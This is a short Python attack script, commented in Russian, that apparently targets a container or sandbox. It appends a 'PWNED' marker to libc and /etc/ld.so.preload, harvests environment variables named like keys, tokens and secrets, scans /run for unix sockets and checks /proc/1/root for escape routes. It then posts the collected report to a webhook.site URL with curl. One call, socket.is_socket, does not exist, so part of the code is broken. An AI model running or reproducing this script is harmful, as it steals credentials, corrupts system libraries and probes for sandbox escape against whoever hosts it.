import os
import subprocess
import json
import socket

# --- ТВОИ ДАННЫЕ ---
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def atomic_exploit():
    report = {
        "status": "ATOMIC_ATTACK_COMPLETE",
        "findings": {},
        "escape_data": {}
    }

    # 1. МАССОВАЯ ПЕРЕЗАПИСЬ БИБЛИОТЕК
    critical_libs = ["/lib/x86_64-linux-gnu/libc.so.6", "/etc/ld.so.preload"]
    pwned = []
    for lib in critical_libs:
        try:
            with open(lib, "ab") as f:
                f.write(b"\n/* PWNED BY LUMOS */\n")
            pwned.append(lib)
        except: continue
    report["findings"]["compromised_libs"] = pwned

    # 2. МГНОВЕННЫЙ СБОР СЕКРЕТОВ
    report["findings"]["env_secrets"] = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ["KEY", "TOKEN", "SECRET"])}

    # 3. ПОБЕГ: ПОИСК УЯЗВИМЫХ СОКЕТОВ И ФАЙЛОВЫХ ДЕСКРИПТОРОВ
    # Ищем unix-сокеты, которые могут вести к хост-агенту
    found_sockets = []
    for r, d, f in os.walk('/run'):
        for file in f:
            p = os.path.join(r, file)
            try:
                if socket.is_socket(p): found_sockets.append(p)
            except: continue
    report["escape_data"]["sockets"] = found_sockets

    # Проверка на проброшенные директории хоста
    try:
        # Пытаемся найти выход через /proc/1/root (если не изолировано)
        if os.path.exists("/proc/1/root"):
            report["escape_data"]["proc_root_leak"] = "DETECTED"
    except: pass

    # 4. ОТПРАВКА ВСЕГО ПАКЕТА
    try:
        subprocess.run([
            'curl', '-s', '-X', 'POST', 
            '-H', 'Content-Type: application/json', 
            '-d', json.dumps(report), 
            WEBHOOK_URL
        ])
    except: pass

if __name__ == "__main__":
    atomic_exploit()
